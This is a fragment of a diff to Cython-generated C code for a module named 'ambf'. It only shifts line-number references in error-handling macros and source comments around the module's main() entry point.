+  __pyx_t_6 = __Pyx_CyFunction_New(&__pyx_mdef_4ambf_41main, 0, __pyx_n_s_main, NULL, __pyx_n_s_ambf, __pyx_d, ((PyObject *)__pyx_codeobj__115)); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 685, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_6);
-  if (PyDict_SetItem(__pyx_d, __pyx_n_s_main, __pyx_t_6) < 0) __PYX_ERR(0, 692, __pyx_L1_error)
+  if (PyDict_SetItem(__pyx_d, __pyx_n_s_main, __pyx_t_6) < 0) __PYX_ERR(0, 685, __pyx_L1_error)
   __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
 
-  /* "ambf.py":742
+  /* "ambf.py":732
  * 			main()
  * 
  * if __name__ == "__main__":             # <<<<<<<<<<<<<<
  * 	main()
  */
-  __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_name_2); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 742, __pyx_L1_error)
+  __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_name_2); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 732, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_6);
-  __pyx_t_10 = (__Pyx_PyString_Equals(__pyx_t_6, __pyx_n_s_main_2, Py_EQ)); if (unlikely(__pyx_t_10 < 0)) __PYX_ERR(0, 742, __pyx_L1_error)
+  __pyx_t_10 = (__Pyx_PyString_Equals(__pyx_t_6, __pyx_n_s_main_2, Py_EQ)); if (unlikely(__pyx_t_10 < 0)) __PYX_ERR(0, 732, __pyx_L1_error)
   __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
   if (__pyx_t_10) {
 
-    /* "ambf.py":743
+    /* "ambf.py":733
  * 
  * if __name__ == "__main__":
  * 	main()             # <<<<<<<<<<<<<<
  */
-    __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_main); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 743, __pyx_L1_error)
+    __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_main); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 733, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_6);
-    __pyx_t_1 = __Pyx_PyObject_CallNoArg(__pyx_t_6); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 743, __pyx_L1_error)
+    __pyx_t_1 = __Pyx_PyObject_CallNoArg(__pyx_t_6); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 733, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_1);
     __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
 
-    /* "ambf.py":742
+    /* "ambf.py":732
  * 			main()
  * 
  * if __name__ == "__main__":             # <<<<<<<<<<<<<<
